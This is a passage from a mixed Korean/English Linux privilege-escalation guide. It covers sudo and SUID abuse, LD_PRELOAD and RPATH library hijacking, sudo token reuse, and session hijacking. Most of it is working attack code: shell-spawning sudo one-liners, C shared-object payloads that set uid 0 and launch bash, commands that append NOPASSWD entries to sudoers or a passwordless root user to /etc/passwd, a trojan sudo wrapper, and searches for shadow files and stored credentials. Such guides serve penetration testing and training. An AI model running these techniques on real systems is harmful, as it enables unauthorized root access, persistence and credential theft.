interesting-groups-linux-pe/
{{#endref}}

### 클립보드

가능하면 클립보드에 흥미로운 내용이 있는지 확인하세요.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 암호 정책
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 알려진 비밀번호

환경의 **비밀번호를 알고 있다면** 그 비밀번호로 **각 사용자로 로그인해 보세요**.

### Su Brute

많은 노이즈를 발생시키는 것을 신경 쓰지 않고 대상 컴퓨터에 `su`와 `timeout` 바이너리가 존재한다면, [su-bruteforce](https://github.com/carlospolop/su-bruteforce)를 사용해 사용자를 무차별 대입 공격해 볼 수 있습니다.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)는 `-a` 파라미터로 사용자 무차별 대입도 시도합니다.

## Writable PATH abuses

### $PATH

$PATH의 어떤 폴더에 **쓰기할 수 있는** 것을 발견하면, 그 쓰기 가능한 폴더 안에 **backdoor를 생성**하여 다른 사용자(가능하면 root)가 실행할 때 권한 상승을 할 수 있습니다. 단, 해당 명령은 $PATH에서 당신의 쓰기 가능한 폴더보다 앞에 위치한 폴더에서 **로드되지 않아야** 합니다.

### SUDO and SUID

sudo를 사용해 특정 명령을 실행할 수 있거나, 일부 파일에 suid 비트가 설정되어 있을 수 있습니다. 다음을 사용해 확인하세요:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
**일부 예상치 못한 commands는 파일을 읽고 및/또는 쓰거나 심지어 command를 실행할 수 있게 합니다.** For example:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 구성은 사용자가 비밀번호를 알지 못해도 다른 사용자의 권한으로 일부 명령을 실행할 수 있도록 허용할 수 있습니다.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
이 예제에서 사용자 `demo`는 `root`로 `vim`을 실행할 수 있으므로, 루트 디렉터리에 ssh key를 추가하거나 `sh`를 호출하여 shell을 얻는 것은 이제 사소한 일입니다.
```
sudo vim -c '!sh'
```
### SETENV

이 지시문은 사용자가 무언가를 실행하는 동안 **환경 변수를 설정**할 수 있게 해줍니다:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
이 예제는 **based on HTB machine Admirer**로, 스크립트를 root로 실행하는 동안 임의의 python 라이브러리를 로드할 수 있도록 **vulnerable** to **PYTHONPATH hijacking**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 실행 경로 우회

**Jump**를 통해 다른 파일을 읽거나 **symlinks**를 사용하세요. 예를 들어 sudoers 파일에서: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
만약 **wildcard**가 사용된다면 (\*), 훨씬 더 쉽습니다:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**대응책**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary 명령 경로 없이

만약 **sudo permission**이 단일 명령에 대해 **경로를 지정하지 않고** 부여되어 있다면: _hacker10 ALL= (root) less_ PATH 변수를 변경하여 이를 악용할 수 있습니다.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
이 기법은 **suid** 바이너리가 **경로를 지정하지 않고 다른 명령을 실행하는 경우(항상 **_strings_** 로 이상한 SUID 바이너리의 내용을 확인하세요)**에도 사용할 수 있습니다.

[실행할 Payload 예제.](payloads-to-execute.md)

### 명령 경로가 있는 SUID binary

만약 **suid** 바이너리가 **경로를 지정하여 다른 명령을 실행한다면**, suid 파일이 호출하는 명령 이름으로 된 함수를 만들어 **함수를 export** 해보면 됩니다.

예를 들어, suid 바이너리가 _**/usr/sbin/service apache2 start**_ 를 호출한다면, 해당 명령 이름으로 함수를 생성하고 export 시도해야 합니다:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
그런 다음 suid 바이너리를 호출하면 이 함수가 실행됩니다

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 환경 변수는 하나 이상의 공유 라이브러리(.so 파일)를 표준 C 라이브러리(`libc.so`)를 포함한 다른 모든 라이브러리보다 먼저 loader에 의해 로드되도록 지정하는 데 사용됩니다. 이 과정을 라이브러리 사전 로드(preloading a library)라고 합니다.

그러나 이 기능이 악용되는 것을 방지하고 시스템 보안을 유지하기 위해, 특히 **suid/sgid** 실행파일과 관련해서 시스템은 몇 가지 조건을 강제합니다:

- loader는 실제 사용자 ID(_ruid_)가 유효 사용자 ID(_euid_)와 일치하지 않는 실행파일에 대해 **LD_PRELOAD**를 무시합니다.
- suid/sgid가 설정된 실행파일의 경우, 사전 로드되는 라이브러리는 표준 경로에 있고 또한 suid/sgid인 것들로만 제한됩니다.

권한 상승은 `sudo`로 명령을 실행할 수 있고 `sudo -l` 출력에 **env_keep+=LD_PRELOAD** 문구가 포함되어 있는 경우 발생할 수 있습니다. 이 구성은 **LD_PRELOAD** 환경 변수가 `sudo`로 명령을 실행할 때도 유지되고 인식되게 하여, 잠재적으로 권한이 상승된 상태로 임의의 코드를 실행하게 할 수 있습니다.
```
Defaults        env_keep += LD_PRELOAD
```
다음 경로로 저장: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
그런 다음 **compile it** using:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
마지막으로, 실행 중에 **escalate privileges**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 비슷한 privesc는 공격자가 **LD_LIBRARY_PATH** env variable을 제어하는 경우 악용될 수 있습니다. 이는 공격자가 라이브러리가 검색될 경로를 제어하기 때문입니다.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

정상적이지 않아 보이는 **SUID** 권한을 가진 binary를 만났을 때, 해당 바이너리가 **.so** 파일을 제대로 로드하는지 확인하는 것이 좋습니다. 다음 명령을 실행하여 확인할 수 있습니다:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
예를 들어, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 같은 오류가 발생하면 잠재적인 취약점이 있음을 나타냅니다.

이를 exploit하기 위해서는, 예를 들어 _"/path/to/.config/libcalc.c"_ 라는 C 파일을 생성하고 다음 코드를 포함하도록 합니다:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
이 코드는 컴파일되어 실행되면 파일 권한을 조작하고 권한이 상승된 쉘을 실행하여 권한을 상승시키는 것을 목표로 합니다.

위 C 파일을 다음 명령으로 공유 객체(.so) 파일로 컴파일하세요:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
마지막으로, 영향을 받은 SUID binary를 실행하면 exploit이 유발되어 잠재적으로 시스템 침해로 이어질 수 있습니다.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
쓰기 가능한 폴더에서 라이브러리를 로드하는 SUID 바이너리를 찾았으므로, 해당 폴더에 필요한 이름으로 라이브러리를 생성합시다:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
다음과 같은 오류가 발생하면
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 는 로컬 보안 제한을 우회하기 위해 공격자가 악용할 수 있는 Unix 바이너리의 선별된 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/) 는 명령에 **인수만 주입할 수 있는** 경우를 위한 동일한 자료입니다.

이 프로젝트는 제한된 쉘을 탈출하거나, 권한을 상승하거나 유지하거나, 파일을 전송하거나, bind 및 reverse shell을 생성하거나, 기타 post-exploitation 작업을 용이하게 하기 위해 악용될 수 있는 Unix 바이너리의 정상적인 기능을 수집합니다.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 두 번째 **exploit** (`exploit_v2.sh`)는 _/tmp_에 **root가 소유하고 setuid가 설정된** sh shell을 생성합니다
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 이 **세 번째 exploit** (`exploit_v3.sh`)는 **sudoers file을 생성**하여 **sudo tokens를 영구화하고 모든 사용자가 sudo를 사용할 수 있도록 허용**합니다
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

폴더나 그 폴더 안에 생성된 파일들 중 어느 파일에 대해든 **쓰기 권한**이 있다면, 바이너리 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)를 사용해 특정 user와 PID에 대한 **sudo token을 생성**할 수 있습니다.\\

예를 들어, 파일 _/var/run/sudo/ts/sampleuser_을 덮어쓸 수 있고 해당 user로 PID 1234인 셸을 가지고 있다면, 패스워드를 알 필요 없이 **sudo privileges를 획득**할 수 있습니다. 다음과 같이:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

파일 `/etc/sudoers` 및 `/etc/sudoers.d` 내부의 파일들은 누가 `sudo`를 어떻게 사용할 수 있는지를 구성합니다. 이 파일들은 **기본적으로 user root와 group root만 읽을 수 있습니다**.\
**만약** 이 파일을 **읽을 수 있다면** 몇 가지 **흥미로운 정보를 얻을 수 있습니다**, 그리고 만약 어떤 파일을 **쓸 수 있다면** **escalate privileges**할 수 있습니다.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
쓰기 권한이 있으면 이 권한을 악용할 수 있다.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
이 권한들을 악용하는 또 다른 방법:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` 바이너리의 몇몇 대안으로 OpenBSD용 `doas` 등이 있으니, `/etc/doas.conf`에서 설정을 확인하세요.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

특정 사용자가 기기에 접속해 권한 상승을 위해 `sudo`를 자주 사용하는 것을 알고, 해당 사용자 컨텍스트에서 shell을 확보했다면, 먼저 당신의 코드를 root로 실행한 뒤 사용자의 명령을 실행하도록 하는 새로운 sudo 실행파일을 만들 수 있습니다. 그런 다음 사용자 컨텍스트의 $PATH를 수정(예: .bash_profile에 새 경로 추가)하면 사용자가 sudo를 실행할 때 당신의 sudo 실행파일이 실행됩니다.

사용자가 다른 shell(예: bash가 아닐 경우)을 사용하면 새 경로를 추가하기 위해 다른 파일들을 수정해야 합니다. 예를 들어 [sudo-piggyback](https://github.com/APTy/sudo-piggyback)은 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`을 수정합니다. 다른 예시는 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)에서 찾을 수 있습니다.

또는 다음과 같이 실행할 수도 있습니다:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 공유 라이브러리

### ld.so

The file `/etc/ld.so.conf` indicates **로드된 구성 파일들이 어디에 있는지**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib를 `/var/tmp/flag15/`에 복사하면 프로그램에서 `RPATH` 변수에 지정된 대로 해당 위치에서 사용됩니다.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
그런 다음 `/var/tmp`에 악성 라이브러리를 다음 명령으로 생성하세요: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 권한

Linux capabilities는 프로세스에 제공되는 루트 권한의 **하위 집합**을 제공합니다. 이는 루트 권한을 **더 작고 구별되는 단위로 분할**합니다. 각 단위는 개별적으로 프로세스에 부여될 수 있으며, 이렇게 전체 권한 집합이 줄어들면 악용 위험이 감소합니다.\
다음 페이지를 읽어 **capabilities와 이를 악용하는 방법**에 대해 더 알아보세요:


{{#ref}}
linux-capabilities.md
{{#endref}}

## 디렉토리 권한

디렉토리에서, **"execute" 비트**는 해당 사용자가 "**cd**"로 폴더에 들어갈 수 있음을 의미합니다.\
**"read"** 비트는 사용자가 **파일을 나열**할 수 있음을 의미하고, **"write"** 비트는 사용자가 **파일을 삭제하고 새 파일을 생성**할 수 있음을 의미합니다.

## ACLs

Access Control Lists (ACLs)는 임의 권한의 2차 계층을 나타내며, 전통적인 ugo/rwx 권한을 **재정의**할 수 있습니다. 이러한 권한은 소유자나 그룹의 구성원이 아닌 특정 사용자에게 권한을 허용하거나 거부함으로써 파일 또는 디렉토리 접근을 보다 세밀하게 제어할 수 있게 합니다. 이 수준의 **세분화는 더 정밀한 접근 관리를 보장**합니다. 추가 정보는 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)에서 확인하세요.

**부여** 사용자 "kali"에게 파일에 대한 읽기 및 쓰기 권한:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**가져오기** 시스템에서 특정 ACL을 가진 파일:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Open shell sessions

**이전 버전**에서는 다른 사용자(**root**)의 일부 **shell** 세션을 **hijack**할 수 있습니다.\
**최신 버전**에서는 **자신의 사용자 계정**의 screen 세션에만 **connect**할 수 있습니다. 하지만 **세션 내부의 흥미로운 정보**를 발견할 수 있습니다.

### screen sessions hijacking

**screen 세션 나열**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**세션에 연결**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

이것은 **오래된 tmux 버전**에서 발생하던 문제였다. 비권한 사용자로서 root가 만든 tmux (v2.1) 세션을 hijack할 수 없었다.

**tmux sessions 나열**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**세션에 연결**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006년 9월부터 2008년 5월 13일 사이에 Debian 계열 시스템(Ubuntu, Kubuntu 등)에서 생성된 모든 SSL 및 SSH 키는 이 버그의 영향을 받을 수 있습니다.\
이 버그는 해당 OS에서 새로운 ssh 키를 생성할 때 발생합니다. **가능한 변형이 단 32,768개에 불과했기 때문입니다**. 즉 모든 가능성을 계산할 수 있으며 **ssh public key만 있으면 대응하는 private key를 검색할 수 있습니다**. 계산된 가능성 목록은 여기에서 확인할 수 있습니다: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 비밀번호 인증이 허용되는지 지정합니다. 기본값은 `no`입니다.
- **PubkeyAuthentication:** 공개키 인증이 허용되는지 지정합니다. 기본값은 `yes`입니다.
- **PermitEmptyPasswords**: 비밀번호 인증이 허용될 때, 서버가 빈 비밀번호 문자열을 가진 계정으로의 로그인을 허용하는지 지정합니다. 기본값은 `no`입니다.

### PermitRootLogin

root가 ssh로 로그인할 수 있는지 지정합니다. 기본값은 `no`입니다. 가능한 값:

- `yes`: root는 비밀번호와 private key를 사용해 로그인할 수 있음
- `without-password` or `prohibit-password`: root는 오직 private key로만 로그인 가능
- `forced-commands-only`: root는 private key로만 로그인하며 command 옵션이 지정된 경우에만 가능
- `no`: 허용 안 함

### AuthorizedKeysFile

사용자 인증에 사용될 수 있는 공개 키를 포함하는 파일을 지정합니다. `%h` 같은 토큰을 포함할 수 있으며 이는 홈 디렉터리로 대체됩니다. **절대 경로**( `/`로 시작)나 **사용자 홈에서의 상대 경로**를 지정할 수 있습니다. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding은 서버에 (without passphrases!) 키를 남겨두는 대신 **use your local SSH keys instead of leaving keys** 할 수 있게 해줍니다. 따라서 ssh를 통해 **jump** **to a host** 한 뒤, 거기서 다시 **jump to another** host로 이동할 때 당신의 **initial host**에 위치한 해당 **key**를 **using**할 수 있습니다.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
주의: `Host`가 `*`인 경우 사용자가 다른 머신으로 이동할 때마다 그 호스트는 키에 접근할 수 있으므로 보안 문제가 발생한다.

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 흥미로운 파일

### 프로필 파일

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
이상한 profile 스크립트가 발견되면 **민감한 정보**가 있는지 확인해야 합니다.

### Passwd/Shadow 파일

OS에 따라 `/etc/passwd` 및 `/etc/shadow` 파일은 다른 이름을 사용하거나 백업 파일이 있을 수 있습니다. 따라서 `/etc/passwd` 및 `/etc/shadow` 파일을 **모두 찾아** **읽을 수 있는지 확인**하여 파일 안에 **해시가 있는지** 확인하는 것이 좋습니다:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
어떤 경우에는 `/etc/passwd` (또는 이에 상응하는) 파일 안에서 **password hashes**를 찾을 수 있습니다.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 쓰기 가능한 /etc/passwd

먼저, 다음 명령어들 중 하나로 비밀번호를 생성합니다.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
그런 다음 사용자 `hacker`를 추가하고 생성된 비밀번호를 추가하세요.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
예: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

이제 `su` 명령을 `hacker:hacker`로 사용할 수 있습니다

또는 비밀번호 없이 더미 사용자를 추가하려면 다음 줄을 사용할 수 있습니다.\  
경고: 현재 시스템의 보안이 저하될 수 있습니다.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
참고: BSD 플랫폼에서는 `/etc/passwd`가 `/etc/pwd.db` 및 `/etc/master.passwd`에 위치하며, `/etc/shadow`는 `/etc/spwd.db`로 이름이 바뀝니다.

일부 민감한 파일에 **쓰기 가능한지** 확인해야 합니다. 예를 들어, 어떤 **서비스 구성 파일**에 쓸 수 있나요?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
예를 들어, 머신이 **tomcat** 서버를 실행 중이고 **modify the Tomcat service configuration file inside /etc/systemd/,** 할 수 있다면, 다음 줄들을 수정할 수 있습니다:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
당신의 backdoor는 다음에 tomcat이 시작될 때 실행됩니다.

### 폴더 확인

다음 폴더들은 백업이나 흥미로운 정보를 포함하고 있을 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (아마 마지막 것은 읽을 수 없겠지만 시도해보세요)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 이상한 위치/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 지난 몇 분 동안 수정된 파일
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 파일
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 파일
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 숨겨진 파일
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH에 있는 Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **웹 파일**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **백업**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 비밀번호가 포함된 알려진 파일

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)의 코드를 읽어보면, **비밀번호를 포함할 수 있는 여러 파일**을 검색합니다.\
**또 다른 흥미로운 도구**로는 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)가 있으며, Windows, Linux 및 Mac의 로컬 컴퓨터에 저장된 많은 비밀번호를 복구하는 데 사용되는 오픈 소스 애플리케이션입니다.

### Logs

logs를 읽을 수 있다면 **그 안에서의 흥미로운/기밀 정보**를 찾을 수 있습니다. logs가 더 이상할수록 더 흥미로울 것입니다(아마도).\
또한 일부 **잘못 구성된**(backdoored?) **audit logs**는 이 게시물에 설명된 것처럼 audit logs 안에 **비밀번호를 기록**할 수 있게 할 수도 있습니다: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
로그를 읽기 위해서는 [**adm**](interesting-groups-linux-pe/index.html#adm-group) 그룹이 매우 유용합니다.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
